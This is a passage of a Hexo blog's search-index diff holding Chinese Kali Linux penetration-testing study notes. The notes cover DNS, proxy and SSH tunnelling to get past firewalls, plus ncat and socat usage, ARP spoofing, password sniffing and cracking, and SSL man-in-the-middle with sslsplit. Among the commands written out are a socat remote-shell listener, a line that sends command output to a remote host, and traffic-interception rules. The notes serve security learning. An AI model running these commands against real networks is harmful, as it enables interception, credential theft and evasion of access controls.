字段加上ip，否则在所有网卡上侦听端口</li><li>http_access<ul><li>allow !Safe_ports</li><li>allow CONNECT !SSL_ports</li><li>allow all</li></ul></li><li>通过/^acl 可以查看到Safe_ports端口</li></ul></li></ul></li><li><p>客户端</p><ul><li><code>proxytunnel -a 80 -p 1.1.1.2:3128 -d 192.168.43.72:80</code><ul><li>-a 本地侦听端口</li><li>-p代理服务器的地址</li><li>-d目标资源</li></ul></li></ul></li><li><p>服务端</p><ul><li>常规的代理服务器</li></ul></li></ul><h5 id="实验环境2"><a href="#实验环境2" class="headerlink" title="实验环境2"></a>实验环境2</h5><ul><li>外网资源非防火墙允许端口<ul><li>修改目标资源侦听端口可能无法躲避防火墙深层检测(检测80端口的流量是不是http（协议层检测）)</li><li>外网安装squid3代理服务器并侦听80端口</li><li>创建隧道：<ul><li><code>proxytunnle -a 80 -p 1.1.1.16:3128 -r 192.168.43.72:80 -d 192.168.43.72:22</code><ul><li>-r :自己的代理服务器</li></ul></li></ul></li></ul></li></ul><h5 id="实验环境3"><a href="#实验环境3" class="headerlink" title="实验环境3"></a>实验环境3</h5><ul><li>ssh客户端配置自动创建代理链隧道（即，完成实验环境2中的两次代理）</li><li>通过ssh配置文件 ~/.ssh/config 来完成</li></ul><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>http的X-Forwarded-For字段，如果不做清除会暴露服务器真实ip地址</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>流量操控技术-DNS协议隧道</title>
+      <link href="/2020/11/12/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93/"/>
+      <url>/2020/11/12/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-DNS%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93/</url>
+      
+        <content type="html"><![CDATA[<h3 id="DNS协议隧道"><a href="#DNS协议隧道" class="headerlink" title="DNS协议隧道"></a>DNS协议隧道</h3><ul><li>防火墙禁止TCP出战访问流量<ul><li>SSH隧道、端口转发全部失效</li><li>DNS的工作原理适合用于实现隧道</li></ul></li><li>DNS工作原理<ul><li>DNS隧道原理：注册受自己控制的DNS记录</li></ul></li></ul><a id="more"></a><h4 id="DNS2TCP"><a href="#DNS2TCP" class="headerlink" title="DNS2TCP"></a>DNS2TCP</h4><ul><li>利用合法DNS服务器实现DNS隧道</li><li>C/S（dns2tcp/dns2tcpd）结构</li><li>通过txt记录加密传输数据（A记录长度有限）</li><li>隧道建立后保持连接</li><li>默认记录生存时间3秒</li></ul><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><ul><li><code>apt-get install dns2tcp</code></li><li>Kali默认安装</li></ul><h5 id="环境配置1（直接通过防火墙访问外网DNS服务器）"><a href="#环境配置1（直接通过防火墙访问外网DNS服务器）" class="headerlink" title="环境配置1（直接通过防火墙访问外网DNS服务器）"></a>环境配置1（直接通过防火墙访问外网DNS服务器）</h5><ul><li><p>Win2003:安装DNS服务器；配置转发器；创建区域lab.com;指派二级域test.lab.com；NS记录指向Kali</p></li><li><p>防火墙：只允许UDP 53端口出站</p></li><li><p>客户端（Bodhi Linux）</p><ul><li><code>dns2tcpc -c -k pass -d 1 -l 2222 -r ssh -z test.lab.com</code><ul><li>-c 启动压缩，提高网络效率</li></ul></li><li>-k 服务端配置文件中设置的密码，可以不设置。<ul><li>-l 本地侦听端口</li><li>-r resources</li><li>-z 服务端的域名</li></ul></li></ul></li><li><p>服务端（Kali）</p><ul><li>服务端配置文件：<ul><li>/etc/dns2tcpd.conf</li><li>.dns2tcprcd（也可以在当前用户主目录下创建这个文件，就不需要指定-f参数了）</li><li>资源可以是其它地址</li></ul></li><li>启动</li><li><code>dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</code><ul><li>-F:前端运行</li><li>-d:debug level 1-3</li><li>-f :指定配置文件</li></ul></li></ul></li></ul><h5 id="环境配置2（防火墙内DNS服务器访问指定外网DNS服务器）"><a href="#环境配置2（防火墙内DNS服务器访问指定外网DNS服务器）" class="headerlink" title="环境配置2（防火墙内DNS服务器访问指定外网DNS服务器）"></a>环境配置2（防火墙内DNS服务器访问指定外网DNS服务器）</h5><ul><li>同样的操作</li></ul><h5 id="资源访问"><a href="#资源访问" class="headerlink" title="资源访问"></a>资源访问</h5><ul><li>本地ssh资源</li><li>socks代理</li><li>隧道嵌套</li></ul><h4 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h4><ul><li>对下行数据不进行编码，因此性能优秀</li><li>支持多平台：Linux、BSD、MacOS、Windows</li><li>最大16个并发连接</li><li>强制密码支持</li><li>支持同网段 隧道IP（在客户端和服务器端分别创建虚拟网卡，分别绑定一个新的ip。这两个新ip处于同一网段，而这个网段与客户端服务端的网段都不同）</li><li>支持多种DNS记录类型</li><li>丰富的隧道质量检测措施</li></ul><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p>服务端：</p><figure class="hljs highlight plain"><figcaption><span>-f -c 2.2.2.1 test.lab.com```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs iodined"><br>-f:前台运行<br><br>-c：检查ip地址<br><br>ip地址：本机上隧道网段的ip地址（ifconfig查看，dns0）<br><br>客户端：<br><br>&#96;&#96;&#96;iodine -f 1.1.1.2 test.lab.com<br></code></pre></td></tr></table></figure><ul><li>这里指定的是本地DNS服务器ip，也可以不指定，自己检测</li></ul><p><code>curl --socks5 -hostname 127.0.0.1:7001</code></p><h5 id="隧道网络接口"><a href="#隧道网络接口" class="headerlink" title="隧道网络接口"></a>隧道网络接口</h5><ul><li>不基于资源的通用隧道，如同本网段内两台相邻的主机。</li><li>服务器端和客户端分别生成隧道网络接口dns0</li><li>隧道两端接口的IP地址应不同于客户端和服务端网段</li><li>隧道可以嵌套其它隧道，如ssh</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>流量操控技术-NCAT、SOCAT</title>
+      <link href="/2020/11/11/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-NCAT%E3%80%81SOCAT/"/>
+      <url>/2020/11/11/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-NCAT%E3%80%81SOCAT/</url>
+      
+        <content type="html"><![CDATA[<h4 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h4><ul><li><p>NC的衍生版软件,Nmap的一部分。</p></li><li><p>代理功能</p><ul><li><code>ncat -l 8080 --proxy-type http --proxy-auth user:pass</code><ul><li>-l 默认端口31337</li></ul></li></ul></li><li><p>Broker中介功能</p><ul><li>服务器：ncat -l 333 – broker</li><li>客户端之间发送任何信息都会被hub到其它客户端</li><li>批量执行命令<ul><li><code>ncat 1.1.1.1 --sh-exec &quot;echo `pwd`&quot;</code></li><li><code>ncat --send-only 1.1.1.1 &lt; inputfile</code></li></ul></li></ul></li></ul><a id="more"></a><h4 id="SOCAT"><a href="#SOCAT" class="headerlink" title="SOCAT"></a>SOCAT</h4><ul><li>被称为nc++</li><li>命令使用产看 socat -hhh</li></ul><hr><ul><li>连接端口<ul><li><code>socat - tcp:1.1.1.1:80</code><ul><li>- 代表标准输入输出</li></ul></li></ul></li><li>侦听端口<ul><li><code>socat - tcp4-listen:22</code></li></ul></li></ul><hr><ul><li><p>接收文件</p><ul><li><code>socat - tcp4-listen:3333 open:2.txt,create,append</code></li></ul></li><li><p>发送文件</p><ul><li><code>cat 1.txt | socat - tcp4:192.168.43.51:3333</code></li></ul></li></ul><hr><ul><li>远程shell–服务端<ul><li><code>socat tcp-l:23 exec:sh,pty,stderr</code></li></ul></li><li>端口转发<ul><li><code>socat tcp4-listen:8080,fork tcp4:1.1.1.1:22</code><ul><li>fork,每当端口收到一个连接，新建一个子进程。</li><li>收到请求后，转发到1.1.1.1:22</li></ul></li></ul></li></ul><hr><ul><li>执行命令，将结果发到远端<ul><li><code>socat - udp-l:2001</code></li><li><code>echo &quot;`id`&quot; | socat - udp-datagram:192.168.43.72:2001</code></li></ul></li></ul><hr><ul><li><p>UDP全端口任意内容发包</p><ul><li>for PORT in {1..65535} do echo “aaaaa”|socat - udp4-datagram 192.168.43.72:$PORT;sleep .1;done</li></ul></li><li><p>二进制编辑器</p><ul><li>echo -e “\0\14\0\0\c”|socat -u -file:/usr/bin/squide.exe,seek,seek=0x00074420</li></ul></li><li><p>简单的WEB服务器</p><ul><li>socat -T 1 -d -d  TCP-L:10081，reuseaddr,fork,crlf  SYSTEM:”echo -e xxxxxxx”</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>流量操控技术-rinetd、SSH</title>
+      <link href="/2020/11/10/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-rinetd%E3%80%81SSH/"/>
+      <url>/2020/11/10/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-rinetd%E3%80%81SSH/</url>
+      
+        <content type="html"><![CDATA[<h3 id="流量操控技术-Rinetd、SSH"><a href="#流量操控技术-Rinetd、SSH" class="headerlink" title="流量操控技术-Rinetd、SSH"></a>流量操控技术-Rinetd、SSH</h3><ul><li>Traffic manipulation technique</li><li>渗透测试中经常遇到访问受限的网络环境</li><li>使用隐蔽的手段逃避安全检查和朔源追踪</li><li>证明看似严格的访问控制仍然存在弱点</li><li>在非受信任的网络中实现安全的数据传输</li></ul><a id="more"></a><hr><ul><li>重定向（Redirection）<ul><li>IP、Port</li></ul></li><li>隧道（Tunneling）<ul><li>在不受信任的网络环境中实现安全的通信</li><li>通常使用多种加密技术建立通信隧道</li><li>点到点（IP2IP）、端到端（Port2Port）隧道</li><li>VPN：pptp、l2tp、IPSec、SSL vpn</li></ul></li><li>封装（encapsulation）<ul><li>通常结合在隧道中使用，使用一种协议封装一种协议（RPC o http、VoIP）</li><li>使用网关设备实现不同类型网络的互联互通</li></ul></li></ul><hr><ul><li>Rinetd<ul><li>安装：apt-get install rinetd</li><li>配置：/etc/rinetd.conf<ul><li>bindadd bindport connectadd connectport</li></ul></li><li>运行：rinetd</li></ul></li><li>应用场景<ul><li>重定向web流量，突破上网限制</li><li>远程桌面重定向</li><li>Nc重定向获得shell</li><li>不兼容FTP等二次连接的协议</li></ul></li></ul><hr><h3 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><ul><li><p>SSH支持双向通信隧道</p><ul><li>将其它TCP端口的通信通过SSH连接来转发</li><li>用SSh作为传输层协议，对流量自动加解密</li><li>突破防火墙访问规则的限制，可用于翻墙</li></ul></li><li><p>SSH本地端口转发</p><ul><li>使效果类似于rinetd</li><li>将一本地端口与远程服务器建立隧道</li></ul></li><li><p>本地端口转发</p><ul><li>本机侦听端口，访问转发到远程主机指定端口</li></ul></li><li><p>远程端口转发</p><ul><li>远程侦听端口，访问转发到本机主机指定端口</li></ul></li><li><p>动态隧道模式</p></li></ul><hr><h4 id="SSH本地端口转发"><a href="#SSH本地端口转发" class="headerlink" title="SSH本地端口转发"></a>SSH本地端口转发</h4><ul><li><p>启动ssh</p><ul><li><code>service ssh start</code></li></ul></li><li><p>ssh默认不能使用root账号登陆，需要修改配置文件</p><ul><li>/etc/ssh/sshd_config<ul><li>PermitRootLogin yes</li><li>Port 53</li><li>PasswordAuthentication yes</li></ul></li></ul></li><li><p><code>ssh  -CfNg -L 7001:192.168.2.178:80 root@192.168.2.218 -p 53</code></p><ul><li>-C 压缩数据减少占用带宽，增加传输速度</li><li>-f 后台运行进程</li><li>-N 不执行登录shell</li><li>-g 复用访问时作为网关，支持多主机访问本地侦听端口</li></ul></li><li><p>端口转发基于建立起来的SSH隧道，隧道中断则端口转发中断</p></li><li><p>只能在建立隧道时创建转发，不能为已有隧道增加端口转发</p></li></ul><hr><h4 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h4><ul><li><p><code>ssh -CfNg -R&lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote prt&gt;</code></p></li><li><p>SSH侦听端口开在远程SSH Server上</p></li><li><p>侦听端口永远开在应用客户端一方</p></li><li><p>远程 -g 参数无效</p></li></ul><hr><h4 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h4><ul><li><p>本地、远程端口转发都需要固定应用服务器IP、Port</p><ul><li>应用端口繁多，逐个转发效率低</li><li>某些应用不固定端口</li><li>某些网站不支持IP直接访问</li><li>使用非受信网络上网时保护流量不被嗅探</li></ul></li><li><p>本地侦听socks4/5代理端口</p><ul><li>由SSh server决定如何转发</li><li>可以作为翻墙代理</li><li>配置客户端代理（浏览器）</li><li>使用proxychains支持无代理客户端</li></ul></li><li><p><code>ssh -CfNg -D 7001 root@192.168.2.218 -p 53</code></p></li></ul><hr><h4 id="X协议转发"><a href="#X协议转发" class="headerlink" title="X协议转发"></a>X协议转发</h4><ul><li>远程登陆Linux GUI运行图形化界面工具<ul><li>-VNC</li><li>X Windows</li></ul></li><li>防火墙限制访问时<ul><li>基于SSH的X转发</li><li>ssh -X <a href="mailto:user@1.1.1.1">user@1.1.1.1</a> -p53</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>密码嗅探</title>
+      <link href="/2020/11/10/%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/"/>
+      <url>/2020/11/10/%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/</url>
+      
+        <content type="html"><![CDATA[<p>三层地址：IP 网络到网络</p><p>二层地址：MAC 主机到主机</p><p>交换机与HUB</p><ul><li>HUB属于一层设备，全端口转发（不安全，共享带宽）</li><li>交换机根据学习地址转发</li></ul><a id="more"></a><h3 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a>密码嗅探</h3><ul><li>开启路由转发<ul><li>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</li></ul></li><li>arpspoof<ul><li><code>arpspoof -t 192.168.1.101 -r 192.168.1.1</code></li></ul></li><li>网络嗅探<ul><li>查看流量中的图片<ul><li>driftnet -i eth0 -a -d tempdir</li></ul></li><li>查看访问的url<ul><li>urlsnarf -i eth0</li></ul></li><li>嗅探密码<ul><li>dsniff -i eth0 -m(自动解码传输协议)<ul><li>/usr/share/dsniff/dsniff.services</li></ul></li></ul></li><li>dns欺骗,可以钓鱼（修改53端口的包）<ul><li>dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof/hosts</li></ul></li></ul></li></ul><h4 id="DNS欺骗代理"><a href="#DNS欺骗代理" class="headerlink" title="DNS欺骗代理"></a>DNS欺骗代理</h4><ul><li><p>搭建假的dns服务器</p></li><li><p>dnschef –fakeip=1.1.1.10 –fakedomains=<a href="http://www.google.com,www.youtube.com" target="_blank" rel="noopener">www.google.com,www.youtube.com</a> –interface 1.1.1.2 -q</p></li><li><p>将被害者DNS指向伪造的DNS服务器</p></li></ul><h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><ul><li>注入XSS<ul><li>即使没有xss漏洞，也可以直接向http请求中注入xss攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意。</li></ul></li><li>Mitmf安装</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>密码破解</title>
+      <link href="/2020/11/09/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
+      <url>/2020/11/09/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
+      
+        <content type="html"><![CDATA[<h3 id="在线密码破解"><a href="#在线密码破解" class="headerlink" title="在线密码破解"></a>在线密码破解</h3><ul><li>hydra</li><li>medusa</li></ul><a id="more"></a><h3 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h3><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><ul><li>禁止明文传输密码</li><li>每次认证使用hash算法加密密码传输（hash算法加密容易，解密困难）</li><li>服务器端用户数据库应加盐保存</li></ul><h4 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h4><ul><li>嗅探获取密码hash</li><li>利用漏洞登陆服务器，从数据库获取密码hash</li><li>识别hash类型<ul><li>长度、字符集</li></ul></li><li>利用离线破解工具碰撞密码hash</li></ul><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul><li>离线不会触发密码锁定机制</li><li>不会产生大量登陆失败日志引起管理员注意</li></ul><h4 id="HASH识别工具"><a href="#HASH识别工具" class="headerlink" title="HASH识别工具"></a>HASH识别工具</h4><ul><li><p>hash-identifier</p></li><li><p>hashid</p></li><li><p>可能识别错误或无法识别</p></li></ul><h4 id="Windows-Hash获取工具"><a href="#Windows-Hash获取工具" class="headerlink" title="Windows Hash获取工具"></a>Windows Hash获取工具</h4><ul><li>利用漏洞：pwdump、fgdump、mimikatz、wce</li><li>物理接触：samdump2<ul><li>在物理机上插入U盘，启动kaliLive虚拟机</li><li>挂载windows硬盘<ul><li><code>mount /dev/sda1 /mnt</code></li></ul></li><li>到sam数据库目录下<ul><li><code>cd /mnt/Windows/System32/config</code></li></ul></li><li>执行samdump2<ul><li><code>samdump2 SYSTEM SAM -o sam.hash</code></li></ul></li></ul></li></ul><h4 id="离线密码破解–Hashcat"><a href="#离线密码破解–Hashcat" class="headerlink" title="离线密码破解–Hashcat"></a>离线密码破解–Hashcat</h4><ul><li>开源多线程密码破解工具</li><li>支持80多种算法的破解<ul><li><code>hashcat -h</code></li></ul></li><li>六种模式<ul><li>-0 Straight：字典破解</li><li>-1 Combination：将字典中密码进行组合</li><li>-2 Toggle case：尝试字典中所有密码的大小写字母组合</li><li>-3 Brute force：指定字符集（或全部字符集）所有组合</li><li>-4 Permutation：字典中密码的全部字符置换组合（比如123：123 321 132 213 231）</li><li>-5 Table-lookup：程序为字典中所有密码自动生成掩码</li></ul></li><li>支持掩码方式的密码字典</li></ul><h4 id="oclhashcat"><a href="#oclhashcat" class="headerlink" title="oclhashcat"></a>oclhashcat</h4><ul><li>号称世界上最快，基于GPU的密码破解软件</li><li>免费开源、支持多平台、支持分布式、150+hash算法</li><li>硬件支持<ul><li>虚拟机中无法使用</li><li>支持CUDA技术的Nvidia显卡</li><li>支持OpenCl技术的AMD显卡</li><li>安装相应的驱动</li></ul></li><li>限制<ul><li>最大密码长度55字符</li><li>使用Unicode的最大密码长度27字符</li></ul></li><li><code>oclHashcat64 -m 0 hash.txt -a ?a?a?a?a?a?a</code><ul><li>-?l =abcdefghijklmnopqrstuvwxyz</li><li>-?u =ABCDEFGHIJKLMNOPQRSTUVWXYZ</li><li>-?d =0123456789</li><li>-?s =!”#$%&amp;’()’;:,&gt;?&lt;\等</li><li>-a =?l?u?d?s</li><li>-b =0x00-0xff</li></ul></li></ul><h4 id="RainbowCrack"><a href="#RainbowCrack" class="headerlink" title="RainbowCrack"></a>RainbowCrack</h4><ul><li>基于时间记忆权衡技术生成彩虹表<ul><li>也可以直接去网站下载彩虹表</li></ul></li><li>提前计算密码的Hash值，通过比对hash值破解密码</li><li>计算hash的速度很慢，修改版支持CUDA、GPU</li><li>KALI中包含的RainbowCrack工具<ul><li>rtgen：预计算、生成彩虹表，耗时的阶段</li><li>rtsort：对rtgen生成顿彩虹表进行排序</li><li>rcrack：查找彩虹表破解密码</li><li>以上命令必须顺序使用 </li></ul></li><li>彩虹表<ul><li>密码明文、hash值、hash算法、字符集、明文长度范围</li></ul></li></ul><h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><ul><li>破解linux和windows密码</li><li>johney图形化的john</li></ul><h4 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h4><ul><li>基于彩虹表的LM、NTLM密码破解软件</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>https攻击-中间人攻击</title>
+      <link href="/2020/11/07/https%E6%94%BB%E5%87%BB-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
+      <url>/2020/11/07/https%E6%94%BB%E5%87%BB-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[<h3 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a>HTTPS攻击</h3><ul><li>全站https正成为潮流趋势<ul><li>淘宝、百度</li></ul></li><li>HTTPS的作用<ul><li>CIA</li><li>解决的是信息传输过程中数据被篡改、窃取</li><li>加密：对称、非对称、单向</li></ul></li><li>HTTPS攻击方法<ul><li>降级攻击<ul><li>将高强度算法降级为低强度算法</li></ul></li><li>解密攻击（明文、证书伪造）</li><li>协议漏洞、https实现方法的漏洞、配置不严格</li></ul></li></ul><a id="more"></a><h4 id="SSL（Secure-socket-layer）"><a href="#SSL（Secure-socket-layer）" class="headerlink" title="SSL（Secure socket layer）"></a>SSL（Secure socket layer）</h4><ul><li>保证网络通信安全的加密协议</li><li>1994年由Netscape开发成为统一标准</li><li>1999年TLS（Transport Layer security）取代SSL v3</li><li>近年来发现的SSL协议漏洞使业界认为其漏洞已经不可软件修复<ul><li>Heartbleed</li><li>POODLE</li><li>BEAST</li></ul></li><li>TLS/SSL、HTTPS、HTTP over SSL 通俗上表示同意含义</li><li>SSL/TLS也被用于其它场景的传输通道加密<ul><li>邮件传输（服务器间、客户端与服务器间）</li><li>数据库服务器间</li><li>LDAP身份认证服务器间</li><li>SSL VPN</li><li>远程桌面RDP通信过程中的加密和身份认证</li></ul></li></ul><h4 id="WEB通信中的SSL加密"><a href="#WEB通信中的SSL加密" class="headerlink" title="WEB通信中的SSL加密"></a>WEB通信中的SSL加密</h4><ul><li>公钥证书（受信任的第三方证书颁发机构签名颁发）<ul><li>VeriSign</li><li>Thawte</li><li>GlobalSign</li><li>Symantec</li></ul></li><li>加密过程<ul><li><ol><li>握手</li><li>协商加密算法（密钥交换算法、非对称加密算法、对称加密算法、哈希算法、）</li><li>获取公钥证书</li><li>验证公钥证书</li><li>交换会话密钥</li><li>加密信息传输</li></ol></li></ul></li><li>加密算法<ul><li>非对称加密算法<ul><li>Diffie-Hellman key exchange</li><li>Rivest Shamir Adleman（RSA）</li><li>Elliptic Curve Cryptography（ECC）</li></ul></li><li>对称加密算法<ul><li>Data Encryption Standard（DES）/3DES</li><li>Advance Encryption Standard（AES）</li><li>International Data Encryption Algo（IDEA）</li><li>Rivest Cipher 4（RC4）<ul><li>WEP、TLS/SSL、RDP、Secure shell</li></ul></li></ul></li><li>单向加密算法（HASH）<ul><li>MD5</li><li>SHA1</li><li>SHA2</li><li>SHA3</li></ul></li></ul></li></ul><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul><li>Openssl<ul><li>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</li><li>连接443端口<code>openssl s_client -connect www.baidu.com:443</code></li><li>看是否支持不安全的cypher suite：<code>openssl s_client -tls1_2 -cipher &#39;XXXXXXXX&#39; -connect www.baidu.com</code></li><li>查看已知的不安全的cipher suite：<code>openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;</code><ul><li>密钥交换、身份认证、数据加密、hash算法</li><li>所有算法去ssl官网查看</li></ul></li></ul></li><li>SSLScan<ul><li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li><li>默认会检查CRIME、heartbleed漏洞</li><li>绿色表示安全、红色黄色需要引起注意</li><li>TLS支持的cipher suite<ul><li>查看<code>sslscan -tlsall www.taobao.com:443</code></li></ul></li><li>分析证书详细数据<ul><li><code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></li></ul></li></ul></li><li>SSLyze<ul><li>Python编写</li><li>检查SSL过时版本</li><li>检查存在弱点的cipher suite</li><li>支持从列表文件查询多个站点</li><li>检查是否支持会话修复</li><li><code>sslyze --regular www.taobao.com:443</code></li></ul></li><li>Nmap<ul><li>nmap –script=ssl-enum-ciphers.nse <a href="http://www.taobao.com" target="_blank" rel="noopener">www.taobao.com</a></li></ul></li><li>ssllabs<ul><li><a href="http://www.ssllabs.com" target="_blank" rel="noopener">www.ssllabs.com</a></li></ul></li></ul><h4 id="SSL中间人攻击"><a href="#SSL中间人攻击" class="headerlink" title="SSL中间人攻击"></a>SSL中间人攻击</h4><h5 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h5><ul><li>攻击者位于客户端和服务器通信链路中<ul><li>ARP</li><li>DHCP</li><li>修改网关</li><li>修改DNS</li><li>修改HOSTS</li><li>ICMP、STP、OSPF（同一个局域网）</li></ul></li><li>加密流量</li><li>前提<ul><li>客户端已经信任伪造证书颁发机构</li><li>攻击者控制了合法证书颁发机构</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端，并强制其信任伪造证书</li></ul></li></ul><h5 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h5><h6 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a>SSLsplit</h6><ul><li>透明SSL/TLS中间人攻击工具</li><li>对客户端伪装成服务器，对服务器伪装成普通客户端</li><li>伪装服务器需要伪造证书</li><li>支持SSL/TLS加密的SMTP、POP3\FTP等通信中间人攻击</li></ul><p><strong>操作</strong></p><ul><li><p>利用openssl生成证书私钥：<code>openssl genrsa -out ca.key 2048</code></p><ul><li>不会生成公钥，因为公钥提取自私钥</li></ul></li><li><p>利用私钥签名生成证书：<code>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</code></p></li><li><p>开启本机路由功能：sysctl -w net.ipv4.ip_forward=1</p><ul><li>使流经的请求可以被正常转发</li><li>或者直接修改文件内容 /proc/sys/net/ipv4/ip_forward</li></ul></li><li><p>iptables端口转发规则</p><ul><li>将请求到本机的ssl流量转发给sslsplit<ul><li>iptables -L 查看当前存在的规则</li><li>iptables -F,清空当前所有规则</li><li>先结束本机的80和443端口占用的程序</li><li>iptables -t nat -A PREROUTING -p tcp –dport 80 -j REDIRECT –to-ports 8080<ul><li>在nat表中加一个PREROUTING（路由之前生效的规则）80端口的tcp重定向到8080</li></ul></li><li>iptables -t nat -A PREROUTING -p tcp –dport 443 -j REDIRECT –to-ports 8443</li><li>iptables -t nat -A PREROUTING -p tcp –dport 587-j REDIRECT –to-ports 8443 #MSA</li><li>iptables -t nat -A PREROUTING -p tcp –dport 465-j REDIRECT –to-ports 8443 #SMTPS</li><li>iptables -t nat -A PREROUTING -p tcp –dport 993-j REDIRECT –to-ports 8443 #IMAP</li><li>iptables -t nat -A PREROUTING -p tcp –dport 995 -j REDIRECT –to-ports 8443 #POP3</li></ul></li></ul></li><li><p>Arp欺骗</p><ul><li>arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1</li></ul></li><li><p>启动SSLsplit</p><ul><li>cd ~</li><li>mkdir -p test/logdir</li><li>sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</li></ul></li><li><p>Mitmproxy</p><ul><li>mitmproxy -T –host -w mitmproxy.log</li></ul></li><li><p>SSLStrip</p><ul><li>与前两种工具不同，将客户端到中间人之间的流量变为明文</li><li>sslstrip -l 8080</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WebShell</title>
+      <link href="/2020/11/06/WebShell/"/>
+      <url>/2020/11/06/WebShell/</url>
+      
